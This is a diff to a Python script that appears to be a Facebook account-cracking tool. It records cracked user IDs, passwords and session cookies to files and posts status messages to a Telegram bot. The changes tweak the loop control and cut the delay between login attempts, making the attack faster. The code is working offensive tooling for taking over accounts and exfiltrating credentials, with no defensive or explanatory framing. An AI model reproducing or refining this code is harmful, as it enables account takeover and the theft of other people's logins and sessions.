@@ -1784,10 +1784,10 @@ def m6(ids,pwv):
                         requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                         open('/sdcard/ATOM-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ATOM-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
                         oks.append(cid)
-                        return True
-                if 'die' in res:
+                        break
+                elif 'die' in res:
                         print(f'\r\r{rad}[{green}ATOM-NOV{rad}]{WHITE} {cid} {rad}▶︎ {WHITE}{pas}')
-                        return True
+                        break
               elif 'session_key' in json_response:
                 ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");kuki = f"sb={AJb};{ckkk}"
                 cid = str(q['uid'])
@@ -1801,14 +1801,14 @@ def m6(ids,pwv):
                         requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                         open('/sdcard/ATOM-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ATOM-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
                         oks.append(cid)
-                        return True
-                if 'die' in res:
+                        break
+                elif 'die' in res:
                         print(f'\r\r{rad}[{green}ATOM-NOV{rad}]{WHITE} {cid} {rad}▶︎ {WHITE}{pas}')
-                        return True
+                        break
             else:
               print(f"[Failed] status-code {response.status_code} for {cid}")
               continue
-            time.sleep(0.05)
+            time.sleep(0.01)
         loop+=1
     except requests.exceptions.ConnectionError:
         time.sleep(7)
